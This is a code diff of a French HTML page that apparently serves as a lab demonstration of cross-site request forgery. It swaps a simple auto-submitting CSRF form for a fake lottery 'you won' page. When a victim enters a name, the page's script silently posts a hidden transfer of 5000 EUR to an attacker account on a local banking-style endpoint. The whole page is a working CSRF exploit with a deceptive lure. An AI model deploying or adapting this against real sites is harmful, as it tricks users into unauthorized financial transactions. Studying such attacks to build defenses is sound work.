@@ -1,16 +1,89 @@
-<html>
-
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Vous êtes un gagnant !</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f4f4f9;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .lottery-form {
+      background-color: #fff;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+      text-align: center;
+    }
+    input[type="text"] {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+    }
+    button {
+      background-color: #5cb85c;
+      color: white;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #4cae4c;
+    }
+    h1 {
+      color: #333;
+    }
+  </style>
+</head>
 <body>
-    <h1>Vous avez été attaqué par un CSRF !</h1>
-    <form action="http://localhost:3000/process" method="POST">
-        <input type="hidden" name="name" value="Hacker">
-        <input type="submit" value="Soumettre automatiquement">
+  <div class="lottery-form">
+    <h1>Félicitations, vous avez gagné !</h1>
+    <p>Entrez votre nom pour réclamer votre prix :</p>
+    <form id="fake-lottery-form">
+      <input type="text" name="name" placeholder="Entrez votre nom">
+      <button type="submit">Réclamer mon prix</button>
     </form>
+  </div>
 
-    <script>
-        // Soumettre automatiquement le formulaire sans interaction utilisateur
-        document.forms[0].submit();
-    </script>
+  <script>
+    // Quand l'utilisateur soumet le formulaire de loterie
+    document.getElementById('fake-lottery-form').onsubmit = function(event) {
+      event.preventDefault();
+
+      // Virement malveillant vers le compte de l'attaquant
+      const transferForm = document.createElement('form');
+      transferForm.action = "http://localhost:3000/process-transfer";
+      transferForm.method = "POST";
+
+      // Compte bénéficiaire du hacker
+      const accountInput = document.createElement('input');
+      accountInput.type = "hidden";
+      accountInput.name = "account";
+      accountInput.value = "Hacker-Account-1234";
+
+      // Montant transféré
+      const amountInput = document.createElement('input');
+      amountInput.type = "hidden";
+      amountInput.name = "amount";
+      amountInput.value = "5000"; // 5000 EUR transférés
+
+      // Ajouter les champs cachés dans le formulaire
+      transferForm.appendChild(accountInput);
+      transferForm.appendChild(amountInput);
+
+      // Soumettre automatiquement le formulaire de virement
+      document.body.appendChild(transferForm);
+      transferForm.submit();
+    }
+  </script>
 </body>
-
 </html>
